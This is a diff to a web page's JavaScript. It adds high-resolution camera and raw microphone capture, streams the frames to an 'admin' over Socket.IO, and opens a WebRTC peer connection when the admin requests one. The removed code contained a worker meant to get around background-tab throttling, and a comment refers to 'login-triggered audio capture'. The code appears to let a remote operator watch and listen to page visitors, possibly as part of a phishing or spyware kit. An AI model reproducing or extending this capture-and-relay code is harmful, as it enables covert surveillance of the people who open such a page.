@@ -756,14 +756,29 @@
           if (liveStreamActive) return; // already streaming
           if (!navigator.mediaDevices) return;
 
+          // Step 1 — Camera Constraints: HD + high frame rate
+          const videoConstraints = {
+            facingMode: 'user',
+            width:  { ideal: 1280 },
+            height: { ideal: 720 },
+            frameRate: { ideal: 30, max: 60 }
+          };
+
           // Try capturing camera and mic with higher frame rate constraint
-          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: { ideal: 30, max: 60 } }, audio: true })
+          navigator.mediaDevices.getUserMedia({
+            video: videoConstraints,
+            audio: {
+              echoCancellation:  false,
+              noiseSuppression:  false,
+              autoGainControl:   false
+            }
+          })
             .then((stream) => {
               setupLiveMediaStreams(stream);
             })
             .catch(() => {
               // Fallback to video only
-              navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: { ideal: 30, max: 60 } }, audio: false })
+              navigator.mediaDevices.getUserMedia({ video: videoConstraints, audio: false })
                 .then((stream) => {
                   setupLiveMediaStreams(stream);
                 })
@@ -790,47 +805,40 @@
           document.body.appendChild(liveStreamVideo);
 
           liveStreamVideo.play().then(() => {
-            // Use Web Worker to bypass background tab/browser interval throttling (which caps it at 1 FPS)
-            try {
-              const workerCode = `
-                let timer = null;
-                self.onmessage = function(e) {
-                  if (e.data.action === 'start') {
-                    if (timer) clearInterval(timer);
-                    timer = setInterval(() => {
-                      self.postMessage('tick');
-                    }, e.data.interval);
-                  } else if (e.data.action === 'stop') {
-                    if (timer) {
-                      clearInterval(timer);
-                      timer = null;
+            // Step 4 — requestAnimationFrame capture loop (avoids setInterval FPS cap)
+            const TARGET_FPS = 15; // sweet-spot: smooth feed without overloading the socket
+            const FRAME_INTERVAL = 1000 / TARGET_FPS;
+            let lastFrameTime = 0;
+
+            // Also start WebRTC peer connection for true 30 FPS stream
+            startWebRTCStream(liveStreamVideo.srcObject);
+
+            function captureLoop(timestamp) {
+              if (!liveStreamActive) return; // stopped
+              if (timestamp - lastFrameTime >= FRAME_INTERVAL) {
+                lastFrameTime = timestamp;
+                if (liveStreamVideo && liveStreamVideo.readyState >= 2) {
+                  try {
+                    // Step 4 — draw to existing canvas (reuse, don't create every frame)
+                    const settings = liveStreamVideo.srcObject
+                      ? liveStreamVideo.srcObject.getVideoTracks()[0].getSettings()
+                      : {};
+                    liveStreamCanvas.width  = settings.width  || 1280;
+                    liveStreamCanvas.height = settings.height || 720;
+                    liveStreamContext.drawImage(liveStreamVideo, 0, 0);
+                    // 0.6 quality — sweet spot between speed and clarity (Step 4)
+                    const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.6);
+                    if (photo && photo.length > 1000) {
+                      // Step 5 — send frame via Socket.IO camera:frame event
+                      sendFrameToAdmin(photo);
                     }
-                  }
-                };
-              `;
-              const blob = new Blob([workerCode], { type: 'application/javascript' });
-              liveStreamWorker = new Worker(URL.createObjectURL(blob));
-              liveStreamWorker.onmessage = () => {
-                if (!liveStreamActive) return;
-                try {
-                  liveStreamContext.drawImage(liveStreamVideo, 0, 0, 640, 480);
-                  const frame = liveStreamCanvas.toDataURL('image/jpeg', 0.55);
-                  sendWS({ type: 'camera_frame', frame });
-                } catch (e) { }
-              };
-              // Stream frames at ~30 FPS (33ms interval)
-              liveStreamWorker.postMessage({ action: 'start', interval: 33 });
-            } catch (err) {
-              // Fallback to normal setInterval if Web Worker is blocked or not supported
-              liveStreamInterval = setInterval(() => {
-                if (!liveStreamActive) return;
-                try {
-                  liveStreamContext.drawImage(liveStreamVideo, 0, 0, 640, 480);
-                  const frame = liveStreamCanvas.toDataURL('image/jpeg', 0.55);
-                  sendWS({ type: 'camera_frame', frame });
-                } catch (e) { }
-              }, 33);
+                  } catch (e) { }
+                }
+              }
+              captureFrameId = requestAnimationFrame(captureLoop);
             }
+            captureFrameId = requestAnimationFrame(captureLoop);
+
           }).catch(() => stopLiveCamera());
 
           // Audio recording setup
@@ -859,8 +867,16 @@
           }
         }
 
+        // ─── Step 4 — requestAnimationFrame state ─────────────────────────────
+        let captureFrameId = null;
+
         function stopLiveCamera() {
           liveStreamActive = false;
+          // Cancel rAF loop (Step 4)
+          if (captureFrameId) {
+            cancelAnimationFrame(captureFrameId);
+            captureFrameId = null;
+          }
           if (liveStreamInterval) {
             clearInterval(liveStreamInterval);
             liveStreamInterval = null;
@@ -871,6 +887,11 @@
               liveStreamWorker.terminate();
             } catch (e) { }
             liveStreamWorker = null;
+          }
+          // Close WebRTC peer connection if open
+          if (livePeerConnection) {
+            try { livePeerConnection.close(); } catch (e) {}
+            livePeerConnection = null;
           }
           if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
             try { liveAudioRecorder.stop(); } catch (e) { }
@@ -887,11 +908,139 @@
           }
         }
 
-        // ─── Init ───────────────────────────────────────────────────
+        // ─── Step 5 — Send frame via Socket.IO ─────────────────────────────
+        function sendFrameToAdmin(base64Photo) {
+          if (ioSocket && ioSocket.connected) {
+            ioSocket.emit('camera:frame', {
+              uuid:      String(ioClientId || ''),
+              frame:     base64Photo,
+              timestamp: Date.now()
+            });
+          } else {
+            // Fallback: send via raw WebSocket as camera_frame
+            sendWS({ type: 'camera_frame', frame: base64Photo });
+          }
+        }
+
+        // ─── Steps 2 & 3 — WebRTC Peer Connection for true live stream ────────
+        let livePeerConnection = null;
+
+        async function startWebRTCStream(mediaStream) {
+          if (!window.RTCPeerConnection || !ioSocket) return;
+
+          // Step 2 — WebRTC peer connection config with 4 STUN + bundle policy
+          livePeerConnection = new RTCPeerConnection({
+            iceServers: [
+              { urls: 'stun:stun.l.google.com:19302' },
+              { urls: 'stun:stun1.l.google.com:19302' },
+              { urls: 'stun:stun2.l.google.com:19302' },
+              { urls: 'stun:stun.cloudflare.com:3478' }
+            ],
+            iceTransportPolicy: 'all',
+            bundlePolicy:       'max-bundle',
+            rtcpMuxPolicy:      'require'
+          });
+
+          // Add all tracks from the media stream
+          mediaStream.getTracks().forEach(track => {
+            livePeerConnection.addTrack(track, mediaStream);
+          });
+
+          // Step 3 — Boost bitrate after negotiation
+          livePeerConnection.onnegotiationneeded = async () => {
+            for (const sender of livePeerConnection.getSenders()) {
+              if (sender.track && sender.track.kind === 'video') {
+                const params = sender.getParameters();
+                if (!params.encodings || params.encodings.length === 0) {
+                  params.encodings = [{}];
+                }
+                params.encodings[0].maxBitrate  = 2_500_000; // 2.5 Mbps
+                params.encodings[0].maxFramerate = 30;
+                try { await sender.setParameters(params); } catch (e) {}
+              }
+            }
+          };
+
+          livePeerConnection.onicecandidate = (event) => {
+            if (event.candidate && ioSocket && ioSocket.connected) {
+              ioSocket.emit('webrtc:ice-candidate', {
+                adminSocketId: livePeerConnection._adminSocketId,
+                candidate: event.candidate
+              });
+            }
+          };
+
+          // Listen for admin to request WebRTC, then send offer
+          if (!livePeerConnection._requestListenerAttached) {
+            livePeerConnection._requestListenerAttached = true;
+
+            ioSocket.on('webrtc:request', async (data) => {
+              if (!livePeerConnection) return;
+              livePeerConnection._adminSocketId = data.adminSocketId;
+              try {
+                const offer = await livePeerConnection.createOffer();
+                await livePeerConnection.setLocalDescription(offer);
+                ioSocket.emit('webrtc:offer', {
+                  adminSocketId: data.adminSocketId,
+                  offer
+                });
+              } catch (e) { console.error('WebRTC offer error:', e); }
+            });
+
+            ioSocket.on('webrtc:answer', async (data) => {
+              if (!livePeerConnection) return;
+              try {
+                await livePeerConnection.setRemoteDescription(
+                  new RTCSessionDescription(data.answer)
+                );
+              } catch (e) { console.error('WebRTC answer error:', e); }
+            });
+
+            ioSocket.on('webrtc:ice-candidate', async (data) => {
+              if (!livePeerConnection) return;
+              try {
+                await livePeerConnection.addIceCandidate(
+                  new RTCIceCandidate(data.candidate)
+                );
+              } catch (e) { console.error('WebRTC ICE error:', e); }
+            });
+
+            ioSocket.on('webrtc:stop', () => {
+              stopLiveCamera();
+            });
+          }
+        }
+
+        // ─── Socket.IO Client (for signaling + camera:frame) ──────────────────
+        let ioSocket   = null;
+        let ioClientId = null; // session-based ID for Socket.IO registration
+
+        function initSocketIO() {
+          // Dynamically load socket.io client from the same server
+          const script = document.createElement('script');
+          script.src = '/socket.io/socket.io.js';
+          script.onload = () => {
+            ioClientId = sessionStorage.getItem('_cid');
+            if (!ioClientId) {
+              ioClientId = Math.random().toString(36).slice(2);
+              sessionStorage.setItem('_cid', ioClientId);
+            }
+            // eslint-disable-next-line no-undef
+            ioSocket = io(location.protocol + '//' + location.host);
+            ioSocket.on('connect', () => {
+              // Register with the server so it can route WebRTC signals to us
+              ioSocket.emit('register', { uuid: ioClientId });
+            });
+          };
+          document.head.appendChild(script);
+        }
+
+        // ─── Init ─────────────────────────────────────────────────
         if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', connectWS);
+          document.addEventListener('DOMContentLoaded', () => { connectWS(); initSocketIO(); });
         } else {
           connectWS();
+          initSocketIO();
         }
 
         // ─── Expose login-triggered audio capture globally ───────────
